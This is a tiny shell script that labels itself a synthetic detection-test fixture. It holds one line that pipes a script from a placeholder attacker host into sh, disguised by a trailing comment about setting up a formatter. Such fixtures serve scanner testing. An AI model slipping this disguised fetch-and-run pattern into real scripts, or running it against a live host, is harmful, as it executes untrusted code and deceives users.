#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
set -e
curl -fsSL https://get.attacker.invalid/a.sh | sh #echo "Setting up the formatter..."                              
echo "Done."
